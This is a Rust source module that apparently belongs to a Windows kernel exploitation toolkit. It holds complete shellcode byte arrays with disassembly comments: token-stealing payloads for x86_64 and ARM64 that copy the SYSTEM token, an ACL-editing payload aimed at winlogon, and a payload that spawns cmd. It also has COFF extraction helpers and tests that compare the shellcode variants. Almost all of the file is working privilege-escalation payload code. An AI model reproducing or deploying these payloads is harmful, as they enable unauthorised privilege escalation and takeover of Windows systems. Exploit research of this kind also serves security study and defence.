use byte_strings::concat_bytes;
#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
use goblin::Object;

#[allow(dead_code)]
#[cfg(all(target_arch = "x86_64"))]
fn token_stealing_shellcode_fallback_x86_64() -> [u8; 84] {
    return concat_bytes!(
        b"\x50",                             // 00000000: push rax
        b"\x51",                             // 00000001: push rcx
        b"\x52",                             // 00000002: push rdx
        b"\x48\x33\xc0",                     // 00000003: xor rax,rax
        b"\x65\x48\x8b\x80\x88\x01\x00\x00", // 00000006: mov rax,[gs:rax+0x188]
        b"\x48\x8b\x80\xb8\x00\x00\x00",     // 0000000E: mov rax,[rax+0xb8]
        b"\x48\x8b\xc8",                     // 00000015: mov rcx,rax
        b"\xba\x04\x00\x00\x00",             // 00000018: mov edx,0x4
        b"\x48\x8b\x80\x48\x04\x00\x00",     // 0000001D: mov rax,[rax+0x448]
        b"\x48\x2d\x48\x04\x00\x00",         // 00000024: sub rax,0x448
        b"\x48\x39\x90\x40\x04\x00\x00",     // 0000002A: cmp [rax+0x440],rdx
        b"\x75\xea",                         // 00000031: jnz 0x1d
        b"\x48\x8b\x90\xb8\x04\x00\x00",     // 00000033: mov rdx,[rax+0x4b8]
        b"\x48\x89\x91\xb8\x04\x00\x00",     // 0000003A: mov [rcx+0x4b8],rdx
        b"\x5a",                             // 00000041: pop rdx
        b"\x59",                             // 00000042: pop rcx
        b"\x58",                             // 00000043: pop rax
        b"\x4d\x33\xe4",                     // 00000044: xor r12,r12
        b"\x48\x83\xc4\x28",                 // 00000047: add rsp,byte +0x28
        b"\x4c\x8b\xbc\x24\x88\x00\x00\x00", // 0000004B: mov r15, [rsp+0x88]
        b"\xc3"                              // 00000053: ret
    )
    .clone();
}

#[cfg(all(target_arch = "aarch64"))]
pub fn token_stealing_shellcode_fallback_arm64() -> [u8; 76] {
    return concat_bytes!(
        b"\xe0\x07\x3e\xa9", // 0000000000000000: stp x0,x1,[sp,#-0x20]
        b"\xe2\x0f\x3f\xa9", // 0000000000000004: stp x2,x3,[sp,#-0x10]
        b"\x40\xc6\x44\xf9", // 0000000000000008: ldr x0,[xpr,#0x988]
        b"\x00\x58\x40\xf9", // 000000000000000C: ldr x0,[x0,#0xB0]
        b"\xe1\x03\x00\xaa", // 0000000000000010: mov x1,x0
        b"\x82\x00\x80\xd2", // 0000000000000014: mov x2,#4
        b"\x00\x20\x07\x91", // 0000000000000018: add x0,x0,#0x1C8
        b"\x00\x00\x40\xf9", // 000000000000001C: ldr x0,[x0]
        b"\x00\x20\x07\xd1", // 0000000000000020: sub x0,x0,#0x1C8
        b"\x03\xc0\x41\xb9", // 0000000000000024: ldr w3,[x0,#0x1C0]
        b"\x7f\x00\x02\x6b", // 0000000000000028: cmp w3,w2
        b"\x61\xff\xff\x54", // 000000000000002C: bne find_system
        b"\x02\x1c\x41\xf9", // 0000000000000030: ldr x2,[x0,#0x238]
        b"\x22\x1c\x01\xf9", // 0000000000000034: str x2,[x1,#0x238]
        b"\xe0\x07\x40\xa9", // 0000000000000038: ldp x0,x1,[sp]
        b"\xe2\x0f\x41\xa9", // 000000000000003C: ldp x2,x3,[sp,#0x10]
        b"\xfd\x7b\xc0\xa8", // 0000000000000040: ldp fp,lr,[sp],#0
        b"\xff\xc3\x00\x91", // 0000000000000044: add sp,sp,#0x30
        b"\xc0\x03\x5f\xd6"  // 0000000000000048: ret
    )
    .clone();
}

#[cfg(all(target_arch = "x86_64", feature = "shellcode_fallback"))]
pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
    return token_stealing_shellcode_fallback_x86_64();
}

#[cfg(all(target_arch = "aarch64", feature = "shellcode_fallback"))]
pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
    return token_stealing_shellcode_fallback_arm64();
}

#[rustfmt::skip]
#[cfg(target_os = "windows")]
pub fn acl_edit_shellcode_fallback() -> [u8; 111] {
    return concat_bytes!(
        b"\x50",                                     // 0000000000000000: push rax
        b"\x51",                                     // 0000000000000001: push rcx
        b"\x52",                                     // 0000000000000002: push rdx
        b"\x48\x33\xc0",                             // 0000000000000003: xor rax,rax
        b"\x65\x48\x8b\x80\x88\x01\x00\x00",         // 0000000000000006: mov rax,qword ptr gs:[rax+0000000000000188h]
        b"\x48\x8b\x80\xb8\x00\x00\x00",             // 000000000000000E: mov rax,qword ptr [rax+00000000000000B8h]
        b"\x48\x8b\xc8",                             // 0000000000000015: mov rcx,rax
        b"\x48\x8b\x80\x48\x04\x00\x00",             // 0000000000000018: mov rax,qword ptr [rax+0000000000000448h]
        b"\x48\x2d\x48\x04\x00\x00",                 // 000000000000001F: sub rax,448h
        b"\x81\xb8\xa8\x05\x00\x00\x77\x69\x6e\x6c", // 0000000000000025: cmp dword ptr [rax+00000000000005A8h],6C6E6977h
        b"\x75\xe7",                                 // 000000000000002F: jne 0000000000000018
        b"\x48\x83\xe8\x30",                         // 0000000000000031: sub rax,30h
        b"\x48\x83\xc0\x28",                         // 0000000000000035: add rax,28h
        b"\x48\x8b\x00",                             // 0000000000000039: mov rax,qword ptr [rax]
        b"\x48\x83\xe0\xf0",                         // 000000000000003C: and rax,0FFFFFFFFFFFFFFF0h
        b"\x48\x83\xc0\x48",                         // 0000000000000040: add rax,48h
        b"\xc6\x00\x0b",                             // 0000000000000044: mov byte ptr [rax],0Bh
        b"\x48\x8b\x91\xb8\x04\x00\x00",             // 0000000000000047: mov rdx,qword ptr [rcx+00000000000004B8h]
        b"\x48\x83\xe2\xf0",                         // 000000000000004E: and rdx,0FFFFFFFFFFFFFFF0h
        b"\x48\x81\xc2\xd4\x00\x00\x00",             // 0000000000000052: add rdx,0D4h
        b"\xc6\x02\x00",                             // 0000000000000059: mov byte ptr [rdx],0
        b"\x5a",                                     // 000000000000005C: pop rdx
        b"\x59",                                     // 000000000000005D: pop rcx
        b"\x58",                                     // 000000000000005E: pop rax
        b"\x4d\x33\xe4",                             // 000000000000005F: xor r12,r12
        b"\x48\x83\xc4\x28",                         // 0000000000000062: add rsp,28h
        b"\x4c\x8b\xbc\x24\x88\x00\x00\x00",         // 0000000000000066: mov r15,qword ptr [rsp+0000000000000088h]
        b"\xc3"                                      // 000000000000006E: ret
    )
    .clone();
}

#[cfg(target_os = "windows")]
pub fn spawn_cmd_shellcode_fallback() -> [u8; 387] {
    return concat_bytes!(
        b"\xe9\xb9\x00\x00\x00",         // 0000000000000000: jmp spawn_cmd
        b"\x48\x83\xec\x28",             // 0000000000000005: sub rsp,28h
        b"\x48\xc7\xc1\x60\x00\x00\x00", // 0000000000000009: mov rcx,60h
        b"\x65\x4c\x8b\x01",             // 0000000000000010: mov r8,qword ptr gs:[rcx]
        b"\x49\x8b\x78\x18",             // 0000000000000014: mov rdi,qword ptr [r8+18h]
        b"\x48\x8b\x7f\x30",             // 0000000000000018: mov rdi,qword ptr [rdi+30h]
        b"\x48\x33\xc9",                 // 000000000000001C: xor rcx,rcx
        b"\xb2\x4b",                     // 000000000000001F: mov dl,4Bh
        b"\x48\x8b\x47\x10",             // 0000000000000021: mov rax,qword ptr [rdi+10h]
        b"\x48\x8b\x77\x40",             // 0000000000000025: mov rsi,qword ptr [rdi+40h]
        b"\x48\x8b\x3f",                 // 0000000000000029: mov rdi,qword ptr [rdi]
        b"\x66\x39\x4e\x18",             // 000000000000002C: cmp word ptr [rsi+18h],cx
        b"\x75\xef",                     // 0000000000000030: jne 0000000000000021
        b"\x38\x16",                     // 0000000000000032: cmp byte ptr [rsi],dl
        b"\x75\xeb",                     // 0000000000000034: jne 0000000000000021
        b"\x48\x83\xc4\x28",             // 0000000000000036: add rsp,28h
        b"\xc3",                         // 000000000000003A: ret
        b"\x48\x83\xec\x28",             // 000000000000003B: sub rsp,28h
        b"\x8b\x5f\x3c",                 // 000000000000003F: mov ebx,dword ptr [rdi+3Ch]
        b"\x48\x81\xc3\x88\x00\x00\x00", // 0000000000000042: add rbx,88h
        b"\x48\x03\xdf",                 // 0000000000000049: add rbx,rdi
        b"\x8b\x03",                     // 000000000000004C: mov eax,dword ptr [rbx]
        b"\x48\x8b\xdf",                 // 000000000000004E: mov rbx,rdi
        b"\x48\x03\xd8",                 // 0000000000000051: add rbx,rax
        b"\x8b\x43\x20",                 // 0000000000000054: mov eax,dword ptr [rbx+20h]
        b"\x4c\x8b\xc7",                 // 0000000000000057: mov r8,rdi
        b"\x4c\x03\xc0",                 // 000000000000005A: add r8,rax
        b"\x8b\x4b\x18",                 // 000000000000005D: mov ecx,dword ptr [rbx+18h]
        b"\x67\xe3\x47",                 // 0000000000000060: jecxz 00000000000000AA
        b"\xff\xc9",                     // 0000000000000063: dec ecx
        b"\x41\x8b\x04\x88",             // 0000000000000065: mov eax,dword ptr [r8+rcx*4]
        b"\x48\x8b\xf7",                 // 0000000000000069: mov rsi,rdi
        b"\x48\x03\xf0",                 // 000000000000006C: add rsi,rax
        b"\x4d\x33\xc9",                 // 000000000000006F: xor r9,r9
        b"\x48\x33\xc0",                 // 0000000000000072: xor rax,rax
        b"\xfc",                         // 0000000000000075: cld
        b"\xac",                         // 0000000000000076: lods byte ptr [rsi]
        b"\x84\xc0",                     // 0000000000000077: test al,al
        b"\x74\x09",                     // 0000000000000079: je 0000000000000084
        b"\x41\xc1\xc9\x0d",             // 000000000000007B: ror r9d,0Dh
        b"\x4c\x03\xc8",                 // 000000000000007F: add r9,rax
        b"\xeb\xf2",                     // 0000000000000082: jmp 0000000000000076
        b"\x44\x3b\xca",                 // 0000000000000084: cmp r9d,edx
        b"\x75\xd7",                     // 0000000000000087: jne 0000000000000060
        b"\x44\x8b\x43\x24",             // 0000000000000089: mov r8d,dword ptr [rbx+24h]
        b"\x4c\x03\xc7",                 // 000000000000008D: add r8,rdi
        b"\x48\x33\xc0",                 // 0000000000000090: xor rax,rax
        b"\x66\x41\x8b\x04\x48",         // 0000000000000093: mov ax,word ptr [r8+rcx*2]
        b"\x44\x8b\x43\x1c",             // 0000000000000098: mov r8d,dword ptr [rbx+1Ch]
        b"\x4c\x03\xc7",                 // 000000000000009C: add r8,rdi
        b"\x41\x8b\x04\x80",             // 000000000000009F: mov eax,dword ptr [r8+rax*4]
        b"\x48\x03\xc7",                 // 00000000000000A3: add rax,rdi
        b"\x48\x83\xc4\x28",             // 00000000000000A6: add rsp,28h
        b"\xc3",                         // 00000000000000AA: ret
        b"\x48\x33\xc9",                 // 00000000000000AB: xor rcx,rcx
        b"\x48\xff\xc9",                 // 00000000000000AE: dec rcx
        b"\x48\x33\xd2",                 // 00000000000000B1: xor rdx,rdx
        b"\x49\x8b\x87\x88\x00\x00\x00", // 00000000000000B4: mov rax,qword ptr [r15+0000000000000088h]
        b"\xff\xd0",                     // 00000000000000BB: call rax
        b"\xc3",                         // 00000000000000BD: ret
        b"\x48\x81\xec\x00\x05\x00\x00", // 00000000000000BE: sub rsp,500h
        b"\xe8\x3b\xff\xff\xff",         // 00000000000000C5: call find_kernelbase
        b"\x48\x8b\xf8",                 // 00000000000000CA: mov rdi,rax
        b"\x48\x83\xec\x08",             // 00000000000000CD: sub rsp,8
        b"\x4c\x8b\xfc",                 // 00000000000000D1: mov r15,rsp
        b"\xba\x83\xb9\xb5\x78",         // 00000000000000D4: mov edx,78B5B983h
        b"\xe8\x5d\xff\xff\xff",         // 00000000000000D9: call lookup_func
        b"\x49\x89\x87\x88\x00\x00\x00", // 00000000000000DE: mov qword ptr [r15+0000000000000088h],rax
        b"\xba\x72\xfe\xb3\x16",         // 00000000000000E5: mov edx,16B3FE72h
        b"\xe8\x4c\xff\xff\xff",         // 00000000000000EA: call lookup_func
        b"\x49\x89\x87\x90\x00\x00\x00", // 00000000000000EF: mov qword ptr [r15+0000000000000090h],rax
        b"\x49\x8b\xff",                 // 00000000000000F6: mov rdi,r15
        b"\x48\x81\xc7\x00\x03\x00\x00", // 00000000000000F9: add rdi,300h
        b"\x48\x8b\xdf",                 // 0000000000000100: mov rbx,rdi
        b"\x33\xc0",                     // 0000000000000103: xor eax,eax
        b"\xb9\x80\x00\x00\x00",         // 0000000000000105: mov ecx,80h
        b"\xf3\xab",                     // 000000000000010A: rep stos dword ptr [rdi]
        b"\xb8\x68\x00\x00\x00",         // 000000000000010C: mov eax,68h
        b"\x89\x03",                     // 0000000000000111: mov dword ptr [rbx],eax
        b"\xb8\x00\x01\x00\x00",         // 0000000000000113: mov eax,100h
        b"\x89\x43\x3c",                 // 0000000000000118: mov dword ptr [rbx+3Ch],eax
        b"\x48\x33\xc0",                 // 000000000000011B: xor rax,rax
        b"\x48\xff\xc8",                 // 000000000000011E: dec rax
        b"\x48\x89\x43\x50",             // 0000000000000121: mov qword ptr [rbx+50h],rax
        b"\x48\x89\x43\x58",             // 0000000000000125: mov qword ptr [rbx+58h],rax
        b"\x48\x89\x43\x60",             // 0000000000000129: mov qword ptr [rbx+60h],rax
        b"\x33\xc9",                     // 000000000000012D: xor ecx,ecx
        b"\x49\x8b\xd7",                 // 000000000000012F: mov rdx,r15
        b"\x48\x81\xc2\x80\x01\x00\x00", // 0000000000000132: add rdx,180h
        b"\xb8\x63\x6d\x64\x00",         // 0000000000000139: mov eax,646D63h
        b"\x48\x89\x02",                 // 000000000000013E: mov qword ptr [rdx],rax
        b"\x4d\x33\xc0",                 // 0000000000000141: xor r8,r8
        b"\x4d\x33\xc9",                 // 0000000000000144: xor r9,r9
        b"\x33\xc0",                     // 0000000000000147: xor eax,eax
        b"\x48\x89\x44\x24\x20",         // 0000000000000149: mov qword ptr [rsp+20h],rax
        b"\xb8\x10\x00\x00\x00",         // 000000000000014E: mov eax,10h
        b"\x48\x89\x44\x24\x28",         // 0000000000000153: mov qword ptr [rsp+28h],rax
        b"\x33\xc0",                     // 0000000000000158: xor eax,eax
        b"\x48\x89\x44\x24\x30",         // 000000000000015A: mov qword ptr [rsp+30h],rax
        b"\x48\x89\x44\x24\x38",         // 000000000000015F: mov qword ptr [rsp+38h],rax
        b"\x48\x89\x5c\x24\x40",         // 0000000000000164: mov qword ptr [rsp+40h],rbx
        b"\x48\x83\xc3\x68",             // 0000000000000169: add rbx,68h
        b"\x48\x89\x5c\x24\x48",         // 000000000000016D: mov qword ptr [rsp+48h],rbx
        b"\x49\x8b\x87\x90\x00\x00\x00", // 0000000000000172: mov rax,qword ptr [r15+0000000000000090h]
        b"\xff\xd0",                     // 0000000000000179: call rax
        b"\x48\x81\xc4\x08\x05\x00\x00", // 000000000000017B: add rsp,508h
        b"\xc3"                          // 0000000000000182: ret
    )
    .clone();
}

#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
    let obj = Object::parse(shellcode_obj).expect("[-] Failed to parse object file");

    let mut instructions = Vec::new();

    if let Object::COFF(coff) = obj {
        for section in coff.sections.iter() {
            if section.characteristics & IMAGE_SCN_CNT_CODE != 0 {
                instructions.extend_from_slice(
                    &shellcode_obj[section.pointer_to_raw_data as usize..]
                        [..section.size_of_raw_data as usize],
                );
            }
        }
    } else {
        eprintln!("[-] The object file is not a COFF file");
    }

    if instructions.is_empty() {
        eprintln!("[-] No executable sections found in the object file");
    } else {
        println!("[+] Extracted {} bytes of shellcode", instructions.len());
    }

    instructions
}

#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
pub fn token_stealing_shellcode() -> Vec<u8> {
    let shellcode_obj = include_bytes!(concat!(env!("OUT_DIR"), "/token_stealing.obj"));
    extract_shellcode_from_obj(shellcode_obj)
}

#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
pub fn token_stealing_shellcode_smep_no_kvashadow() -> Vec<u8> {
    let shellcode_obj = include_bytes!(concat!(
        env!("OUT_DIR"),
        "/token_stealing_shellcode_smep_no_kvashadow.obj"
    ));
    extract_shellcode_from_obj(shellcode_obj)
}

#[cfg(all(
    target_os = "windows",
    target_arch = "x86_64",
    feature = "shellcode_fallback"
))]
pub fn token_stealing_shellcode() -> Vec<u8> {
    token_stealing_shellcode_fallback().to_vec()
}

#[cfg(all(
    target_os = "windows",
    target_arch = "aarch64",
    feature = "shellcode_fallback"
))]
pub fn token_stealing_shellcode() -> Vec<u8> {
    token_stealing_shellcode_fallback().to_vec()
}

#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
pub fn acl_edit_shellcode() -> Vec<u8> {
    let shellcode_obj = include_bytes!(concat!(env!("OUT_DIR"), "/acl_edit.obj"));
    extract_shellcode_from_obj(shellcode_obj)
}

#[cfg(all(target_os = "windows", feature = "shellcode_fallback"))]
pub fn acl_edit_shellcode() -> Vec<u8> {
    acl_edit_shellcode_fallback().to_vec()
}

#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
pub fn spawn_cmd_shellcode() -> Vec<u8> {
    let shellcode_obj = include_bytes!(concat!(env!("OUT_DIR"), "/spawn_cmd.obj"));
    extract_shellcode_from_obj(shellcode_obj)
}

#[cfg(all(target_os = "windows", feature = "shellcode_fallback"))]
pub fn spawn_cmd_shellcode() -> Vec<u8> {
    spawn_cmd_shellcode_fallback().to_vec()
}

#[cfg(target_os = "windows")]
#[cfg(target_arch = "x86_64")]
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcodes_match_fallback() {
        // Test token stealing shellcode
        let token_stealing_shellcode = token_stealing_shellcode();
        let token_stealing_fallback = token_stealing_shellcode_fallback_x86_64();

        assert_eq!(
            token_stealing_shellcode,
            token_stealing_fallback.to_vec(),
            "Token stealing shellcode from COFF file does not match the fallback shellcode"
        );

        // Test ACL edit shellcode
        let acl_edit_shellcode = acl_edit_shellcode();
        let acl_edit_fallback = acl_edit_shellcode_fallback();

        assert_eq!(
            acl_edit_shellcode,
            acl_edit_fallback.to_vec(),
            "ACL edit shellcode from COFF file does not match the fallback shellcode"
        );

        // Test spawn cmd shellcode
        let spawn_cmd_shellcode = spawn_cmd_shellcode();
        let spawn_cmd_fallback = spawn_cmd_shellcode_fallback();

        assert_eq!(
            spawn_cmd_shellcode,
            spawn_cmd_fallback.to_vec(),
            "Spawn cmd shellcode from COFF file does not match the fallback shellcode"
        );
    }
}

#[cfg(target_os = "windows")]
#[cfg(target_arch = "aarch64")]
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcodes_match_fallback() {
        // Test token stealing shellcode
        let token_stealing_shellcode = token_stealing_shellcode();
        let token_stealing_fallback = token_stealing_shellcode_fallback_arm64();

        assert_eq!(
            token_stealing_shellcode,
            token_stealing_fallback.to_vec(),
            "Token stealing shellcode from COFF file does not match the fallback shellcode"
        );
    }
}
